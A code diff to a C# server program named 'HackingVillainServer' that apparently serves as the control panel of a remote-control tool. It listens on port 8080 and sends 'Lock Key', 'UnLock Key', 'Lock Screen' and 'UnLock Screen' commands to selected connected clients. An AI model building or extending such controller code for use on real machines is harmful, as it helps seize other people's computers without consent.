@@ -25,7 +25,7 @@ namespace HackingVillainServer
             CheckForIllegalCrossThreadCalls = false;
             this.BackgroundImageLayout = ImageLayout.Stretch;
             ImageList list = new ImageList();
-            list.ImageSize = new Size(64, 64);
+            list.ImageSize = new Size(128, 128);
             list.Images.Add(Image.FromFile("쟌.png"));
             listView1.LargeImageList = list;
             _server = AweSock.TcpListen(8080);
@@ -73,6 +73,13 @@ namespace HackingVillainServer
             */
         }
 
+        public void Send(string msg)
+        {
+            Buffer b = Buffer.New();
+            Buffer.Add(b, Encoding.UTF32.GetBytes(msg));
+            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
+        }
+
         private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count != 1)
@@ -84,16 +91,22 @@ namespace HackingVillainServer
 
         private void 활성화EToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Buffer b = Buffer.New();
-            Buffer.Add(b, Encoding.UTF32.GetBytes("UnLock Key"));
-            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
+            Send("UnLock Key");
         }
 
         private void 비활성화DToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            Buffer b = Buffer.New();
-            Buffer.Add(b, Encoding.UTF32.GetBytes("Lock Key"));
-            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
+            Send("Lock Key");
+        }
+
+        private void 활성화EToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Send("UnLock Screen");
+        }
+
+        private void 비활성화DToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Send("Lock Screen");
         }
     }
 }
